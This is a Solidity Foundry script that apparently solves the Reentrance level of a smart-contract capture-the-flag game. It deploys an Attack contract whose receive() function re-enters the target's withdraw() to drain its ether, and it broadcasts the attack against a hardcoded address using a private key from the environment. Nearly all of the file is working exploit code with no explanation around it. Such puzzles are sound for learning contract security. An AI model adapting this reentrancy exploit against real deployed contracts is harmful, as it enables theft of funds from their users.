// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Level10.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    Reentrance reentrance;
    constructor(Reentrance _reenctrance) public {
        reentrance = _reenctrance;
    }

    function withdraw() external {
        reentrance.withdraw(0.001 ether);
        (bool result, ) = msg.sender.call{value: 0.002 ether}("");
        require(result);
    }

    receive() external payable {
        (bool success, ) = address(payable(reentrance)).call(
            abi.encodeWithSignature("withdraw(uint256)", 0.001 ether)
        );
        require(success);
    }
}

contract ReentranceSolution is Script {
    Reentrance public reentranceInstance =
        Reentrance(payable(0x566c829668d1889F975dBd1496BC6c3884951835));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack(reentranceInstance);
        reentranceInstance.donate{value: 0.001 ether}(address(attack));
        attack.withdraw();
        vm.stopBroadcast();
    }
}
